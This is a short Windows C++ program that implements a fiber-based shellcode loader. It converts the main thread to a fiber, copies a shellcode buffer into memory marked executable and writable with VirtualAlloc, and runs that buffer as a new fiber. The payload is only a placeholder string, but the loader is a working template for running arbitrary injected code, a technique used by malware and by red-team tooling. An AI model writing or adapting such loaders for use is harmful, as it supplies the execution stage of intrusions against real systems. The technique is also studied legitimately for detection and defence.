#include <iostream>
#include <windows.h>

int main()
{
	//Convert Current thread to fiber
	PVOID Mainfiber = ConvertThreadToFiber(NULL);

	unsigned char shellcode[] = "shellCode content";

	PVOID shellCodeLocation = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(shellCodeLocation, shellcode, sizeof(shellcode));

	PVOID FiberWithShellCode = CreateFiber(NULL, (LPFIBER_START_ROUTINE)shellCodeLocation, NULL);

	SwitchToFiber(FiberWithShellCode);

	return 0;
}
